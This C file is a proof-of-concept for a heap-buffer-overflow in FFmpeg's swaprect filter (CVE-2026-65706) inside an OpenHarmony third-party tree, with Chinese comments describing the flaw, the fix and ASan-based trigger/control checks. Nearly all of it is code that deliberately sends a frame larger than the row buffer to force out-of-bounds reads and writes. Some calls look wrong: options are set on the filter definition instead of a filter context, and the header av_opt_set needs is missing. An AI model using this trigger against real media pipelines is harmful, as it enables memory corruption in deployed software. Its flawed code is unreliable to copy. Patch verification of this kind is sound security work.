/*
 * CVE-2026-65706 运行验证 PoC — third_party/ffmpeg vf_swaprect 临时行越界
 *
 * 缺陷：vf_swaprect.c config_input 按初始 link 尺寸分配行缓冲；
 * filter_frame 按帧尺寸操作——帧尺寸变化时越界读写。
 * 上游修复：FFmpeg a7e38b6 (2026) 前置尺寸检查。
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c, 基线 n7.1.1) 与上游逐字节一致。
 *
 * 用法：./poc_swaprect trigger|control
 *   trigger: 64x64 初始化后送 512x512 帧 → 行缓冲越界
 *   control: 两帧均 64x64
 * 判读：ASan 原版 trigger 报 heap-buffer-overflow；补丁版返回 EINVAL；
 *       control 两版均正常。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavfilter/avfilter.h>
#include <libavfilter/buffersink.h>
#include <libavfilter/buffersrc.h>
#include <libavutil/frame.h>
#include <libavutil/pixfmt.h>

static int push_frame(AVFilterContext *src, int w, int h)
{
    AVFrame *f = av_frame_alloc();
    f->format = AV_PIX_FMT_YUV420P;
    f->width = w;
    f->height = h;
    if (av_frame_get_buffer(f, 32) < 0) return -1;
    if (av_buffersrc_add_frame(src, f) < 0) return -2;
    av_frame_free(&f);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "Usage: %s trigger|control\n", argv[0]); return 1; }
    int is_trigger = strcmp(argv[1], "trigger") == 0;

    const AVFilter *swaprect = avfilter_get_by_name("swaprect");
    if (!swaprect) { fprintf(stderr, "swaprect filter not found\n"); return 2; }

    AVFilterGraph *graph = avfilter_graph_alloc();
    AVFilterContext *src_ctx, *sink_ctx;

    /* 初始化 link 为 64x64 */
    AVRational tb = {1, 25};
    char args[512];
    snprintf(args, sizeof(args),
             "video_size=64x64:pix_fmt=%d:time_base=%d/%d:pixel_aspect=1/1",
             AV_PIX_FMT_YUV420P, tb.num, tb.den);

    avfilter_graph_create_filter(&src_ctx, avfilter_get_by_name("buffer"),
                                 "src", args, NULL, graph);
    avfilter_graph_create_filter(&sink_ctx, avfilter_get_by_name("buffersink"),
                                 "sink", NULL, NULL, graph);

    /* swaprect: swap 32x32 rect at (0,0) with (32,32) */
    av_opt_set(swaprect, "w", "32", 0);
    av_opt_set(swaprect, "h", "32", 0);
    av_opt_set(swaprect, "x1", "0", 0);
    av_opt_set(swaprect, "y1", "0", 0);
    av_opt_set(swaprect, "x2", "32", 0);
    av_opt_set(swaprect, "y2", "32", 0);

    AVFilterContext *filter_ctx;
    avfilter_graph_create_filter(&filter_ctx, swaprect, "swaprect", NULL, NULL, graph);
    avfilter_link(src_ctx, 0, filter_ctx, 0);
    avfilter_link(filter_ctx, 0, sink_ctx, 0);
    avfilter_graph_config(graph, NULL);

    /* 发送帧 */
    if (push_frame(src_ctx, 64, 64) < 0) return 3;

    if (is_trigger) {
        /* 变尺寸帧 → 行缓冲越界 */
        fprintf(stdout, "pushing 512x512 frame (size change)...\n");
        if (push_frame(src_ctx, 512, 512) < 0) return 4;
    } else {
        if (push_frame(src_ctx, 64, 64) < 0) return 5;
    }

    /* 排空 */
    AVFrame *out = av_frame_alloc();
    while (av_buffersink_get_frame(sink_ctx, out) >= 0) {
        fprintf(stdout, "output frame: %dx%d\n", out->width, out->height);
        av_frame_unref(out);
    }
    av_frame_free(&out);

    avfilter_graph_free(&graph);
    fprintf(stderr, "=== %s: completed ===\n", is_trigger ? "trigger" : "control");
    return 0;
}
